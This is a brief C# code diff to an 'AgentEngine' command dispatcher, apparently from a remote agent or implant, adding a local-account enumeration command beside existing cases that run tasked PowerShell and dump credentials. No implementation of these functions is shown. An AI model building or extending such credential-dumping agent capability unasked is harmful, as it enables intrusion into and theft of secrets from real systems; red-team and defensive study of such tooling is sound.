@@ -713,6 +713,10 @@ public class AgentEngine
                     output = await PowerShellRunner.ExecuteAsync(task.Command, ct);
                     success = true;
                     break;
+                case Common.Models.CommandType.LocalAccounts:
+                    output = await LocalAccountEnumerator.EnumerateAsync(ct);
+                    success = true;
+                    break;
                 case Common.Models.CommandType.CredDump:
                     output = await CredentialDumper.DumpAsync(ct);
                     success = true;
